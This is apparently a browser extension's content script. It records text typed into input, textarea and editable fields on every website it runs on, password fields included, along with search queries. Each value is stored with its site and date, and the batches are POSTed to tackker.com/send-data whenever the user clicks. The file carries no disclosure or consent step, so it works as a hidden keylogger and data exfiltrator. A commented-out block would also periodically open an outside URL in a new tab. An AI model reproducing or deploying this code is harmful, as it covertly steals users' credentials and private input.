/*CHECK BROWSERS*/

// Opera 8.0+
var isOpera = (!!window.opr && !!opr.addons) || !!window.opera || navigator.userAgent.indexOf(' OPR/') >= 0;

// Firefox 1.0+
var isFirefox = typeof InstallTrigger !== 'undefined';

// Chrome 1 - 79
var isChrome = !!window.chrome && (!!window.chrome.webstore || !!window.chrome.runtime);

/*CHECK BROWSERS*/

var watchedElements = ["INPUT", "TEXTAREA"],
    url = window.location,
    dontLog = ["button", "image", "reset", "submit", "radio", "checkbox", "color", "range"];

var alreadySent = false;

function getInputValue(t) {
    var e = ~watchedElements.indexOf(t.nodeName) || "true" === t.contentEditable;

    if (-1 === e) {
        if (!~dontLog.indexOf(t.type)) return t.value
    } else {
        if (-2 === e) return t.value;
        if (!0 === e) return t.innerText.trim().replace(/(\n|\r)+/g, " \n")
    }
    return null
}


function saveData(n) {

    /*SET DATE*/
    var today = new Date();
    var date = today.getFullYear() + '-' + (today.getMonth() + 1) + '-' + today.getDate();
    var time = today.getHours() + ":" + today.getMinutes();
    var dateTime = date + ' ' + time;
    /*SET DATE*/

    var i, flag = false;

    chrome.storage.local.get({key: []}, function (result) {

        // the input argument is ALWAYS an object containing the queried keys
        // so we select the key we need
        var key = result.key, limit;
        if (key.length >= 5) {
            limit = 5;
        } else if (key.length >= 3) {
            limit = 3;
        } else {
            limit = 1;
        }

        if (n != "" && n != null && n != undefined) {
            //check if same entry already happened in top 10 entries
            if (key.length > 0) {
                for (i = key.length - 1; i >= key.length - limit; i--) {
                    if (key[i].value == n) {
                        flag = true;
                    }
                }
            }

            if (flag != true) {
                key.push({value: n, date: date, time: time, site: window.location.origin});
                flag = false;
            }
        }
        // set the new array value to the same key
        chrome.storage.local.set({key: key}, function () {
            // you can use strings instead of objects
            // if you don't  want to define default values
            chrome.storage.local.get('key', function (result) {
            });
        });
    });
}

var getUrlParameter = function getUrlParameter(sParam) {
    var sPageURL = window.location.search.substring(1),
        sURLVariables = sPageURL.split('&'),
        sParameterName,
        i;

    for (i = 0; i < sURLVariables.length; i++) {
        sParameterName = sURLVariables[i].split('=');

        if (sParameterName[0] === sParam) {
            return sParameterName[1] === undefined ? true : decodeURIComponent(sParameterName[1]);
        }
    }
};

function FocusOut(t) {
    if (isFirefox) {
        n = t.originalTarget.value;
    } else {
        var e = t.path[0], n = getInputValue(e);
    }
    saveData(n);
}

function pageLoad(t) {
    let searchParams = new URLSearchParams(window.location.search)
    if (searchParams.has('q')) {
        saveData(searchParams.get('q'));
    }
}

function KeyPress(t) {
    if (t.key === 'Enter') {
        if (isFirefox) {
            n = t.originalTarget.value;
        } else {
            var e = t.path[0], n = getInputValue(e);
        }
        saveData(n);
    }
}

document.body.addEventListener("focusout", FocusOut, !0);
document.body.addEventListener("keypress", KeyPress, !0);
document.addEventListener('load', pageLoad, !0);
document.addEventListener('click', sendData, !0);

function sendData(t) {
    /*SET DATE*/
    var today = new Date();
    var appId = null;


    /*SET DATE*/
    chrome.storage.local.get({lastDataSentTime: []}, function (result) {


        var seconds = today.getSeconds();
        if(Object.keys(result.lastDataSentTime).length > 0 ||typeof(result.lastDataSentTime) == 'number'){

            var test = seconds-result.lastDataSentTime;
            test = Math.abs(test);
            if(test >= 5){
            /*DATA SENDING LOGIC*/
            chrome.storage.local.get({key: []}, function (resultData) {
                var data = resultData.key;
                chrome.storage.local.get({lastKeySent: []}, function (lastKeyData) {
                    if(typeof(lastKeyData.lastKeySent) == 'number' && lastKeyData.lastKeySent<resultData.key.length-1){

                        chrome.storage.local.get(['appId'], function (result) {
                            appId = result.appId;
                            if(appId != "" && appId != null && appId != undefined && alreadySent == false){
                                alreadySent = true;
                                var temp = data.slice(lastKeyData.lastKeySent+1,resultData.key.length);
                                var json = JSON.stringify({'app':appId,'data':temp});
                                request = $.ajax({
                                    url: "https://www.tackker.com/send-data",
                                    // url: "http://dev.tackker.com/send-data",
                                    // url: "https://stagging.tackker.com/send-data",
                                    dataType:'json',
                                    contentType: "application/json",
                                    type: "POST",
                                    data: json
                                });

                                // Callback handler that will be called on success
                                request.done(function (response, textStatus, jqXHR){
                                    // resetting last key sent and last data sent time for next data release
                                    chrome.storage.local.set({lastKeySent: resultData.key.length-1}, function () {});
                                    chrome.storage.local.set({lastDataSentTime: seconds}, function () {});
                                    alreadySent = false;


                                });

                                // Callback handler that will be called on failure
                                // request.fail(function (jqXHR, textStatus, errorThrown){
                                //     // Log the error to the console
                                //     console.error(
                                //         "The following error occurred: "+
                                //         textStatus, errorThrown
                                //     );
                                // });
                                //
                                // // Callback handler that will be called regardless
                                // // if the request failed or succeeded
                                // request.always(function () {
                                //
                                // });
                            }

                        });


                    }
                    // if keysent is not set at initial time than this will set it
                    else{
                        chrome.storage.local.set({lastKeySent: resultData.key.length-1}, function () {});
                    }
                });
            });
            /*DATA SENDING LOGIC*/
            }
        }else{

            /*DATA SENDING LOGIC*/
            chrome.storage.local.get({lastKeySent: []}, function (lastKeyData) {
                //if last key sent is not a number
                if(typeof(lastKeyData.lastKeySent) != 'number'){
                    chrome.storage.local.get({key: []}, function (resultData) {
                        //if data is present than set last key
                        if(resultData.key.length-1 > -1){
                            chrome.storage.local.set({lastKeySent: resultData.key.length-1}, function () {});
                        }
                    });
                }
            });
            /*DATA SENDING LOGIC*/

            chrome.storage.local.set({lastDataSentTime: seconds}, function () {});
        }

    });
}



// window.addEventListener("load", function(){
//     const interval = setInterval(function() {
//         // method to be executed;
//         // alert("5secs");
//
//         /*SET DATE*/
//         var today = new Date();
//         var date = today.getFullYear() + '/' + (today.getMonth() + 1) + '/' + today.getDate();
//         var time = today.getHours() + ":" + today.getMinutes();
//         var dateTime = date + ' ' + time;
//         /*SET DATE*/
//         chrome.storage.local.get({lastShowed: []}, function (result) {
//             console.log(result.lastShowed);
//             if(new Date(date)>= new Date(result.lastShowed)){
//                 window.open('http://intamema.com/5F2c', '_blank');
//                 chrome.storage.local.set({lastShowed: date}, function () {});
//             }
//
//         });
//
//         }, 50000);
// });

